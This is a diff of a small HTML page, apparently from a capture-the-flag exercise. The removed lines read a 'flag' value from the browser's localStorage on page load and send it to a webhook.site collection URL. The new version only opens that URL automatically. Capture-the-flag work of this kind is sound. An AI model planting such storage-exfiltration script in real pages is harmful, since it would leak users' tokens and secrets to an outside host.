@@ -3,24 +3,19 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Send Stored Flag</title>
+    <title>Open Site</title>
     <script>
         document.addEventListener('DOMContentLoaded', () => {
-            const flag = localStorage.getItem('flag'); // Retrieve the flag from localStorage
-            if (flag) {
-                const url = `https://webhook.site/793ce786-73e8-4f90-91dd-68748f201a6a/${flag}`;
-                console.log('Opening URL:', url);
+            const url = 'https://webhook.site/793ce786-73e8-4f90-91dd-68748f201a6a/';
+            console.log('Opening URL:', url);
 
-                // Open the constructed URL
-                window.open(url, '_blank'); // Opens the URL in a new tab
-            } else {
-                console.log('No flag found in storage.');
-            }
+            // Open the URL
+            window.open(url, '_blank'); // Opens the URL in a new tab
         });
     </script>
 </head>
 <body>
-    <h1>Send Stored Flag</h1>
-    <p>The stored flag will be sent automatically.</p>
+    <h1>Open Site</h1>
+    <p>The site will open automatically.</p>
 </body>
 </html>
